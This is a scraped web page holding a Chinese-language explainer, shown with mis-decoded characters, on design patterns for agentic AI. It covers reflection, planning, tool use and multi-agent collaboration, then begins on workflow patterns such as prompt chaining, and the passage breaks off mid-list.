                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><p>åœ¨åŸºäºå¤§æ¨¡å‹çš„AIåº”ç”¨è®¾è®¡ä¸Šï¼Œå­˜åœ¨ç€ä¸¤ç§ä¸åŒçš„æ¨¡å¼ï¼šæ™ºèƒ½ä½“(Agent)å’Œå·¥ä½œæµ(WorkFlow)ã€‚ä¸šç•ŒæŠŠæ™ºèƒ½ä½“å’Œå·¥ä½œæµä»¥åŠå®ƒä»¬çš„æ··åˆä½“ç»Ÿç§°ä¸ºAgentic AIã€‚è®¾è®¡Agentic AIç³»ç»Ÿçš„åŸºç¡€å°±æ˜¯è®¾è®¡æ™ºèƒ½ä½“å’Œå·¥ä½œæµã€‚æœ¬æ–‡å¸¦æ‚¨å¿«é€Ÿäº†è§£æ™ºèƒ½ä½“å’Œå·¥ä½œæµçš„åŸºç¡€è®¾è®¡æ¨¡å¼ï¼ŒæŒæ¡Agentic AIè®¾è®¡çš„æ ¸å¿ƒåŸåˆ™ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€æ™ºèƒ½ä½“åŸºç¡€è®¾è®¡æ¨¡å¼</h2>
<p>æ™ºèƒ½ä½“è®¾è®¡æ¨¡å¼ä½¿æ™ºèƒ½ä½“èƒ½å¤Ÿå®ç°åŠ¨æ€é€‚åº”ã€è§„åˆ’ä¸åä½œï¼Œç¡®ä¿ç³»ç»Ÿå¯ç²¾å‡†ä¸”é«˜æ•ˆåœ°å¤„ç†å¤æ‚çš„ç°å®ä»»åŠ¡ã€‚æ™ºèƒ½ä½“æœ‰å››å¤§åŸºç¡€è®¾è®¡æ¨¡å¼ï¼š</p>
<h3 data-id="heading-1">1ã€åæ€ï¼ˆReflectionï¼‰</h3>
<p>åæ€æ¨¡å¼æ˜¯æ™ºèƒ½ä½“çš„ä¸€é¡¹åŸºç¡€è®¾è®¡æ¨¡å¼ï¼Œèƒ½å¤Ÿä½¿æ™ºèƒ½ä½“å¯¹å…¶è¾“å‡ºç»“æœè¿›è¡Œè¿­ä»£å¼è¯„ä¼°ä¸ä¼˜åŒ–ã€‚é€šè¿‡èå…¥è‡ªæˆ‘åæ€æ¨¡å¼ï¼Œæ™ºèƒ½ä½“å¯è¯†åˆ«å¹¶ä¿®æ­£é”™è¯¯ã€çŸ›ç›¾ä¹‹å¤„ä»¥åŠå¾…æ”¹è¿›çš„ç¯èŠ‚ï¼Œä»è€Œåœ¨ä»£ç ç”Ÿæˆã€æ–‡æœ¬åˆ›ä½œã€é—®ç­”ç­‰å„ç±»ä»»åŠ¡ä¸­æå‡æ‰§è¡Œæ€§èƒ½ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œåæ€æ¨¡å¼çš„å…·ä½“æµç¨‹æ˜¯ï¼šå…ˆä¿ƒä½¿æ™ºèƒ½ä½“ä»æ­£ç¡®æ€§ã€é£æ ¼ä¸æ•ˆç‡ä¸‰ä¸ªç»´åº¦å¯¹è‡ªèº«è¾“å‡ºç»“æœè¿›è¡Œè¯„åˆ¤ï¼Œå†å°†è¯„åˆ¤æ‰€å¾—çš„åé¦ˆä¿¡æ¯èå…¥åç»­çš„è¿­ä»£ä¼˜åŒ–è¿‡ç¨‹ã€‚å•å…ƒæµ‹è¯•ã€ç½‘ç»œæœç´¢ç­‰å¤–éƒ¨å·¥å…·å¯è¿›ä¸€æ­¥å¼ºåŒ–è¿™ä¸€æµç¨‹ â€”â€” å®ƒä»¬æ—¢èƒ½éªŒè¯è¾“å‡ºç»“æœçš„æœ‰æ•ˆæ€§ï¼Œåˆèƒ½å‡¸æ˜¾å…¶ä¸­å­˜åœ¨çš„ä¿¡æ¯ç¼ºå£ã€‚</p>
<p>åœ¨å¤šæ™ºèƒ½ä½“ç³»ç»Ÿä¸­ï¼Œåæ€æ¨¡å¼å¯é€šè¿‡è§’è‰²åˆ†å·¥çš„æ–¹å¼å®ç°ï¼šä¾‹å¦‚ç”±ä¸€ä¸ªæ™ºèƒ½ä½“è´Ÿè´£ç”Ÿæˆè¾“å‡ºå†…å®¹ï¼Œå¦ä¸€ä¸ªæ™ºèƒ½ä½“ä¸“é—¨è¿›è¡Œè¯„åˆ¤ï¼Œä»¥æ­¤æ¨åŠ¨åä½œå¼ä¼˜åŒ–ã€‚ä»¥æ³•å¾‹ç ”ç©¶åœºæ™¯ä¸ºä¾‹ï¼Œæ™ºèƒ½ä½“å¯é€šè¿‡é‡æ–°è¯„ä¼°æ£€ç´¢åˆ°çš„åˆ¤ä¾‹æ³•ï¼Œå¯¹è¾“å‡ºçš„å›å¤å†…å®¹è¿›è¡Œè¿­ä»£ä¼˜åŒ–ï¼Œä»è€Œç¡®ä¿å›å¤çš„å‡†ç¡®æ€§ä¸å…¨é¢æ€§ã€‚åœ¨ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2303.17651" target="_blank" title="https://arxiv.org/pdf/2303.17651" ref="nofollow noopener noreferrer">Self-Refine</a>ã€‹ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2303.11366" target="_blank" title="https://arxiv.org/pdf/2303.11366" ref="nofollow noopener noreferrer">Reflexion</a>ã€‹ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2305.11738" target="_blank" title="https://arxiv.org/pdf/2305.11738" ref="nofollow noopener noreferrer">CRITIC</a>ã€‹ç­‰ç›¸å…³ç ”ç©¶ä¸­ï¼Œåæ€æ¨¡å¼å·²è¢«è¯å®èƒ½æ˜¾è‘—æå‡æ™ºèƒ½ä½“çš„ä»»åŠ¡æ‰§è¡Œæ€§èƒ½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4f0ed4a19504f64abac130d9dd674ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=SZKtT4JcGFP5E0n5dYQeCOFyVYM%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>æ”¯æŒå¯¹ç»“æœè¿›è¡Œè¿­ä»£ä¼˜åŒ–ã€‚</li>
<li>æå‡å¤šæ­¥æ¨ç†ä»»åŠ¡çš„å‡†ç¡®æ€§ã€‚</li>
</ul>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>åœ¨åŒ»ç–—è¯Šæ–­ç³»ç»Ÿä¸­ï¼Œæ™ºèƒ½ä½“åŸºäºæ£€ç´¢æ•°æ®çš„è¿­ä»£åé¦ˆï¼ŒæŒç»­ä¼˜åŒ–è¯Šæ–­ç»“è®ºã€‚</li>
</ul>
<h3 data-id="heading-2">2ã€è§„åˆ’ï¼ˆPlanningï¼‰</h3>
<p>è§„åˆ’æ¨¡å¼æ˜¯æ™ºèƒ½ä½“çš„ä¸€é¡¹åŸºç¡€è®¾è®¡æ¨¡å¼ï¼Œå®ƒèƒ½è®©æ™ºèƒ½ä½“å°†å¤æ‚ä»»åŠ¡è‡ªä¸»æ‹†è§£ä¸ºæ›´å°çš„ã€å¯å¤„ç†çš„å­ä»»åŠ¡ã€‚è¿™ç§èƒ½åŠ›å¯¹äºåŠ¨æ€ã€ä¸ç¡®å®šåœºæ™¯ä¸‹çš„å¤šæ­¥æ¨ç†ä¸è¿­ä»£å¼é—®é¢˜æ±‚è§£è‡³å…³é‡è¦ã€‚å€ŸåŠ©è§„åˆ’æ¨¡å¼ï¼Œæ™ºèƒ½ä½“å¯åŠ¨æ€ç¡®å®šå®Œæˆå¤§å‹ç›®æ ‡æ‰€éœ€çš„æ­¥éª¤åºåˆ—ã€‚è¿™ç§é€‚åº”æ€§ä½¿æ™ºèƒ½ä½“èƒ½å¤Ÿå¤„ç†æ— æ³•é¢„å…ˆå®šä¹‰çš„ä»»åŠ¡ï¼Œä¿éšœå†³ç­–è¿‡ç¨‹çš„çµæ´»æ€§ã€‚</p>
<p>å°½ç®¡è§„åˆ’æ¨¡å¼åŠŸèƒ½å¼ºå¤§ï¼Œä½†ä¸åæ€æ¨¡å¼è¿™ç±»ç¡®å®šæ€§å·¥ä½œæµç›¸æ¯”ï¼Œå…¶äº§å‡ºç»“æœçš„å¯é¢„æµ‹æ€§ç›¸å¯¹è¾ƒä½ã€‚è¯¥æ¨¡å¼ç‰¹åˆ«é€‚ç”¨äºéœ€è¦åŠ¨æ€é€‚é…ã€ä¸”é¢„å®šä¹‰å·¥ä½œæµéš¾ä»¥æ»¡è¶³éœ€æ±‚çš„ä»»åŠ¡åœºæ™¯ã€‚éšç€æŠ€æœ¯æ—¥è¶‹æˆç†Ÿï¼Œå®ƒåœ¨å„é¢†åŸŸæ¨åŠ¨åˆ›æ–°åº”ç”¨çš„æ½œåŠ›å°†æŒç»­é‡Šæ”¾ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49930879c5ed408aa41e5e9a6d8b07f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=Hy7v4OdHyO3p%2Fx4inNTlheihIW8%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>é€šè¿‡ä»»åŠ¡æ‹†è§£ï¼Œä¸ºå¤šæ­¥æ¨ç†æä¾›æ”¯æ’‘ã€‚</li>
<li>åŸºäºä¼˜åŒ–çš„ä»»åŠ¡ä¼˜å…ˆçº§æ’åºï¼Œé™ä½è®¡ç®—å¼€é”€ã€‚</li>
</ul>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>æŸè´¢åŠ¡åˆ†æç³»ç»Ÿé€šè¿‡è§„åˆ’æ•°æ®æ£€ç´¢ä»»åŠ¡ï¼Œå¼€å±•é£é™©è¯„ä¼°å¹¶ç»™å‡ºå†³ç­–å»ºè®®ã€‚</li>
</ul>
<h3 data-id="heading-3">3ã€å·¥å…·è°ƒç”¨ï¼ˆTool Useï¼‰</h3>
<p>å·¥å…·è°ƒç”¨æ¨¡å¼æŒ‡æ™ºèƒ½ä½“é€šè¿‡ä¸å¤–éƒ¨å·¥å…·ã€åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼ˆAPIï¼‰æˆ–è®¡ç®—èµ„æºäº¤äº’ï¼Œæ‹“å±•è‡ªèº«èƒ½åŠ›èŒƒå›´ã€‚è¯¥æ¨¡å¼ä½¿æ™ºèƒ½ä½“å¾—ä»¥çªç ´é¢„è®­ç»ƒçŸ¥è¯†çš„å±€é™ï¼Œå®Œæˆä¿¡æ¯æ”¶é›†ã€è®¡ç®—æ‰§è¡Œä¸æ•°æ®å¤„ç†ç­‰ä»»åŠ¡ã€‚é€šè¿‡å°†å·¥å…·åŠ¨æ€æ•´åˆè‡³å·¥ä½œæµä¸­ï¼Œæ™ºèƒ½ä½“èƒ½å¤Ÿé€‚é…å¤æ‚ä»»åŠ¡åœºæ™¯ï¼Œè¾“å‡ºæ›´ç²¾å‡†ä¸”è´´åˆä¸Šä¸‹æ–‡çš„ç»“æœã€‚</p>
<p>åœ¨ç°ä»£æ™ºèƒ½ä½“ä¸­ï¼Œå·¥å…·è°ƒç”¨æ¨¡å¼è¢«å¹¿æ³›åº”ç”¨äºå„ç±»åœºæ™¯ï¼Œæ¶µç›–ä¿¡æ¯æ£€ç´¢ã€è®¡ç®—æ¨ç†ä»¥åŠä¸å¤–éƒ¨ç³»ç»Ÿçš„å¯¹æ¥äº¤äº’ã€‚éšç€å¤§æ¨¡å‹å·¥å…·è°ƒç”¨åŠŸèƒ½çš„è½åœ°ï¼Œä»¥åŠæ”¯æŒå¤šå·¥å…·è°ƒç”¨ç®¡ç†çš„ç³»ç»Ÿé€æ­¥æˆç†Ÿï¼Œè¯¥æ¨¡å¼çš„æŠ€æœ¯å®ç°å·²å–å¾—æ˜¾è‘—å‘å±•ã€‚è¿™äº›æŠ€æœ¯è¿›æ­¥æ¨åŠ¨äº†æ›´å¤æ‚æ™ºèƒ½ä½“çš„è½åœ° â€”â€” æ™ºèƒ½ä½“å¯é’ˆå¯¹ç‰¹å®šä»»åŠ¡è‡ªä¸»ç­›é€‰å¹¶æ‰§è¡Œæœ€é€‚é…çš„å·¥å…·ã€‚å°½ç®¡å·¥å…·è°ƒç”¨æ¨¡å¼å¤§å¹…æå‡äº†æ™ºèƒ½ä½“çš„æ•ˆèƒ½ï¼Œä½†åœ¨å·¥å…·ç­›é€‰ä¼˜åŒ–æ–¹é¢ä»å­˜åœ¨æŒ‘æˆ˜ï¼Œå°¤å…¶æ˜¯åœ¨å·¥å…·é€‰é¡¹ç¹å¤šçš„åœºæ™¯ä¸‹ã€‚ç›®å‰å·²æœ‰ç ”ç©¶æå‡ºå€Ÿé‰´æ£€ç´¢å¢å¼ºç”Ÿæˆï¼ˆRAGï¼‰æŠ€æœ¯çš„è§£å†³æ–¹æ¡ˆï¼Œä¾‹å¦‚åŸºäºå¯å‘å¼è§„åˆ™çš„å·¥å…·ç­›é€‰æ–¹æ³•ï¼Œä»¥åº”å¯¹è¿™ä¸€éš¾é¢˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bad1ccab8d0d486db7c77f91f8e6de25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=phoLYceoJ2PF9TshQjNoUCZ87Ic%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>çªç ´ç³»ç»Ÿé¢„è®­ç»ƒçŸ¥è¯†çš„å±€é™ï¼Œæ‹“å±•åŠŸèƒ½è¾¹ç•Œã€‚</li>
<li>æ•´åˆå¤–éƒ¨èµ„æºï¼Œèµ‹èƒ½ç‰¹å®šé¢†åŸŸçš„åº”ç”¨è½åœ°ã€‚</li>
</ul>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>ä¸€æ¬¾æ³•å¾‹è¾…åŠ©æ™ºèƒ½ä½“ä»åˆåŒæ•°æ®åº“ä¸­æ£€ç´¢ç›¸å…³æ¡æ¬¾ï¼Œå¹¶è¿ç”¨ç‰¹å®šé¢†åŸŸçš„è§„åˆ™å¼€å±•åˆè§„æ€§åˆ†æã€‚</li>
</ul>
<h3 data-id="heading-4">4ã€å¤šæ™ºèƒ½ä½“åä½œï¼ˆMulti-agent Collaborationï¼‰</h3>
<p>å¤šæ™ºèƒ½ä½“åä½œæ˜¯æ™ºèƒ½ä½“ç³»ç»Ÿçš„ä¸€é¡¹åŸºç¡€è®¾è®¡æ¨¡å¼ï¼Œèƒ½å¤Ÿå®ç°ä»»åŠ¡ä¸“ä¸šåŒ–åˆ†å·¥ä¸å¹¶è¡Œå¤„ç†ã€‚å„æ™ºèƒ½ä½“ä¹‹é—´é€šè¿‡é€šä¿¡å…±äº«ä¸­é—´ç»“æœï¼Œç¡®ä¿æ•´ä½“å·¥ä½œæµå§‹ç»ˆé«˜æ•ˆä¸”é€»è¾‘è¿è´¯ã€‚é€šè¿‡å°†å­ä»»åŠ¡åˆ†é…ç»™ä¸åŒçš„ä¸“ä¸šæ™ºèƒ½ä½“ï¼Œè¯¥æ¨¡å¼å¤§å¹…æå‡äº†å¤æ‚æ™ºèƒ½ä½“ç³»ç»Ÿçš„å¯æ‰©å±•æ€§ä¸é€‚åº”æ€§ã€‚å¤šæ™ºèƒ½ä½“ç³»ç»Ÿå…è®¸å¼€å‘è€…å°†å¤æ‚ä»»åŠ¡æ‹†è§£ä¸ºæ›´å°çš„å¯å¤„ç†å­ä»»åŠ¡ï¼Œå¹¶åˆ†é…ç»™ä¸åŒæ™ºèƒ½ä½“æ‰§è¡Œã€‚è¿™ç§æ–¹å¼ä¸ä»…èƒ½æå‡ä»»åŠ¡æ‰§è¡Œæ€§èƒ½ï¼Œè¿˜èƒ½ä¸ºç®¡ç†å¤æ‚äº¤äº’æä¾›ä¸€ä¸ªç¨³å¥çš„æ¡†æ¶ã€‚æ¯ä¸ªæ™ºèƒ½ä½“éƒ½æ‹¥æœ‰ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ä¸å·¥ä½œæµï¼Œå…¶å·¥ä½œæµå¯æ¶µç›–å·¥å…·è°ƒç”¨ã€åæ€æˆ–è§„åˆ’æ¨¡å¼ç­‰èƒ½åŠ›æ¨¡å—ï¼Œè¿›è€Œå®ç°åŠ¨æ€åä½œå¼é—®é¢˜æ±‚è§£ã€‚</p>
<p>å°½ç®¡å¤šæ™ºèƒ½ä½“åä½œå…·å¤‡å·¨å¤§æ½œåŠ›ï¼Œä½†ç›¸è¾ƒäºåæ€æ¨¡å¼ã€å·¥å…·è°ƒç”¨ç­‰æ›´ä¸ºæˆç†Ÿçš„æ¨¡å¼ï¼Œè¯¥è®¾è®¡æ¨¡å¼çš„ç»“æœå¯é¢„æµ‹æ€§ç›¸å¯¹è¾ƒä½ã€‚ä¸è¿‡ï¼ŒAutoGenã€Crew AIã€LangGraph ç­‰æ–°å…´æ¡†æ¶çš„å‡ºç°ï¼Œæ­£ä¸ºè½åœ°é«˜æ•ˆçš„å¤šæ™ºèƒ½ä½“è§£å†³æ–¹æ¡ˆå¼€è¾Ÿæ–°è·¯å¾„ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d86bd1f280f2430e83eda0d83d7d19f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=VVXSTk3CAPJCeKmj3ej2tAUJVeU%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>é«˜æ•ˆå¤„ç†å¤§è§„æ¨¡åˆ†å¸ƒå¼é—®é¢˜ã€‚</li>
<li>æ•´åˆå„æ™ºèƒ½ä½“çš„ä¸“ä¸šåŒ–èƒ½åŠ›ï¼Œè¾¾æˆæ›´ä¼˜ä»»åŠ¡æˆæ•ˆã€‚</li>
</ul>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>åœ¨å®¢æœåœºæ™¯ä¸­ï¼Œå¤šä¸ªæ™ºèƒ½ä½“ååŒå·¥ä½œ â€”â€” æœ‰çš„ä»å¸¸è§é—®é¢˜è§£ç­”åº“ï¼ˆFAQsï¼‰ä¸­æ£€ç´¢çŸ¥è¯†ï¼Œæœ‰çš„ç”Ÿæˆå›å¤å†…å®¹ï¼Œæœ‰çš„è·Ÿè¿›ç”¨æˆ·åç»­éœ€æ±‚ã€‚</li>
<li>æ³•å¾‹æ™ºèƒ½è¾…åŠ©ç³»ç»Ÿ LawGlance å€ŸåŠ©å¤šæ™ºèƒ½ä½“å·¥ä½œæµç®€åŒ–æ³•å¾‹ç ”ç©¶æµç¨‹ï¼šæ™ºèƒ½ä½“åˆ†å·¥å®Œæˆç›¸å…³æ³•å¾‹æ–‡æ¡£æ£€ç´¢ã€ä¿¡æ¯åˆ†æï¼Œå¹¶è¾“å‡ºç²¾å‡†çš„æ³•å¾‹æ´è§ã€‚è¯¥ç³»ç»Ÿæ•´åˆäº† Crew AIã€LangChain ä¸ Chroma å·¥å…·ï¼Œå®ç°æ³•å¾‹æ–‡æ¡£æ£€ç´¢ã€ç½‘ç»œæœç´¢åŠŸèƒ½ï¼Œå¹¶é’ˆå¯¹ç”¨æˆ·çš„æŸ¥è¯¢éœ€æ±‚ç”Ÿæˆç®€æ´å‡†ç¡®çš„ç­”å¤ã€‚</li>
</ul>
<h2 data-id="heading-5">äºŒã€å·¥ä½œæµåŸºç¡€è®¾è®¡æ¨¡å¼</h2>
<p>å·¥ä½œæµè®¾è®¡æ¨¡å¼ä¸ºå¼€å‘è€…æ„å»ºå‡†ç¡®ã€é«˜æ•ˆã€é«˜æ€§èƒ½çš„å¤§æ¨¡å‹åº”ç”¨æä¾›ä¼˜åŒ–çš„è§£å†³æ–¹æ¡ˆã€‚å…·ä½“é‡‡ç”¨ä½•ç§æ–¹æ¡ˆï¼Œéœ€æ ¹æ®ä»»åŠ¡å¤æ‚åº¦ä¸å¤„ç†éœ€æ±‚è€Œå®šã€‚å·¥ä½œæµæœ‰äº”å¤§åŸºç¡€è®¾è®¡æ¨¡å¼ï¼š</p>
<h3 data-id="heading-6">1ã€æç¤ºé“¾æ¨¡å¼</h3>
<p>æç¤ºé“¾å°†ä¸€é¡¹å¤æ‚ä»»åŠ¡æ‹†è§£ä¸ºå¤šä¸ªæ­¥éª¤ï¼Œæ¯ä¸ªæ­¥éª¤å‡åŸºäºå‰åºæ­¥éª¤çš„ç»“æœæ¨è¿›ã€‚è¿™ç§ç»“æ„åŒ–æ–¹æ³•é€šè¿‡åœ¨æ‰§è¡Œåç»­ç¯èŠ‚å‰ç®€åŒ–æ¯ä¸ªå­ä»»åŠ¡ï¼Œæœ‰æ•ˆæå‡äº†ä»»åŠ¡å¤„ç†çš„å‡†ç¡®æ€§ã€‚ä½†å—é™äºé¡ºåºå¤„ç†æœºåˆ¶ï¼Œè¯¥æ–¹æ³•å¯èƒ½ä¼šå¢åŠ ç³»ç»Ÿå»¶è¿Ÿã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a4768804f8543ffa07b927995e49e35~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=8rlw9m5lF5nJFBSedaFan3Z7HK4%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>å½“æŸé¡¹ä»»åŠ¡å¯è¢«æ‹†è§£ä¸ºè‹¥å¹²å›ºå®šå­ä»»åŠ¡ï¼Œä¸”æ¯ä¸ªå­ä»»åŠ¡å‡å¯¹æœ€ç»ˆè¾“å‡ºç»“æœæœ‰æ‰€è´¡çŒ®æ—¶ï¼Œè¯¥å·¥ä½œæµçš„æ•ˆç”¨å¯å¾—åˆ°æœ€å¤§å‘æŒ¥ã€‚æ­¤æ–¹æ³•åœ¨éœ€è¦é€šè¿‡é€æ­¥æ¨ç†æå‡å‡†ç¡®æ€§çš„åœºæ™¯ä¸­å°¤ä¸ºå®ç”¨ã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
